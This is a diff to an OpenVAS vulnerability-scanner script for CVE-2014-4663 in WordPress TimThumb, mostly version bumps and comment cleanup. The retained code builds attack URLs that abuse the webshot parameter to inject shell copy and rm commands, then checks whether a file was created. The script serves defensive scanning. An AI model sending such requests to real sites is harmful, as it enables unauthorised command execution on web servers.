@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wp_timthumb_remote_code_exec_vuln.nasl 6692 2017-07-12 09:57:43Z teissa $
+# $Id: gb_wp_timthumb_remote_code_exec_vuln.nasl 10000 2018-05-29 12:20:12Z cfischer $
 #
 # Binary Moon TimThumb Remote Code Execution Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805116");
-  script_version("$Revision: 6692 $");
+  script_version("$Revision: 10000 $");
   script_cve_id("CVE-2014-4663");
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 11:57:43 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-05-29 14:20:12 +0200 (Tue, 29 May 2018) $");
   script_tag(name:"creation_date", value:"2014-12-23 11:22:48 +0530 (Tue, 23 Dec 2014)");
   script_name("Binary Moon TimThumb Remote Code Execution Vulnerability");
 
@@ -78,28 +78,15 @@ if(description)
   exit(0);
 }
 
-
 include("misc_func.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-http_port = 0;
-dir = "";
-url = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Check Host Supports PHP
-if(!can_host_php(port:http_port)){
-  exit(0);
-}
-
-## Get WordPress Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
@@ -270,21 +257,15 @@ vulnPath = make_list(
     "/wp-content/themes/wp-premium-orange/timthumb.php",
     "/wp-content/themes/wpbus-d4/includes/timthumb.php",
     "/wp-content/themes/zcool-like/timthumb.php"
-
-
 );   ## More timthumb.php paths can be added here
 
-## Iterate over TimThumb Paths
 foreach eachVulnPath (vulnPath)
 {
-  ## Vulnerable Url
   vulnUrl = dir + eachVulnPath;
 
-  ## Check timthumb.php is present or not
   if(http_vuln_check(port:http_port, url:vulnUrl, check_header:FALSE,
      pattern:">TimThumb version", extra_check:">No image specified<"))
   {
-    ## Create Random File name
     randFile =  rand_str(length:8, charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") + ".php";
 
     ## Command to copy timthumb.php to a random file
@@ -296,17 +277,14 @@ foreach eachVulnPath (vulnPath)
     ## Attack Url to copy timthumb.php
     cpUrl = dir + eachVulnPath + "?webshot=1&src=http://localhost" + dir + cpCmd;
 
-    ## Attack request to run copy command
     if(http_vuln_check(port:http_port, url:cpUrl, check_header:FALSE,
-       pattern:">A TimThumb error has occured<",
+       pattern:">A TimThumb error has occured<", # nb: This is a typo in the TimThumb plugin so don't fix it here...
        extra_check:make_list(">Query String", ">The image being resized is not a valid")))
     {
       cpPath = eachVulnPath - "timthumb.php";
 
-      ## Check file got copied
       cpFileUrl = dir + cpPath + randFile;
 
-      ## Confirm Copied file is present
       if(http_vuln_check(port:http_port, url:cpFileUrl, check_header:FALSE,
          pattern:"HTTP/1.. 400 Bad Request", extra_check:">TimThumb version"))
       {
@@ -318,10 +296,9 @@ foreach eachVulnPath (vulnPath)
 
         ## Attack request to run rm command
         if(http_vuln_check(port:http_port, url:delUrl, check_header:FALSE,
-           pattern:">A TimThumb error has occured<",
+           pattern:">A TimThumb error has occured<", # nb: This is a typo in the TimThumb plugin so don't fix it here...
            extra_check:make_list(">Query String", ">The image being resized is not a valid")))
         {
-          ## Check file got deleted
           if(http_vuln_check(port:http_port, url:cpFileUrl, check_header:FALSE,
              pattern:">TimThumb version", extra_check:">No image specified<")){
             log_message(data:'\nUnable to delete the file at : '+ cpFileUrl, port:http_port);
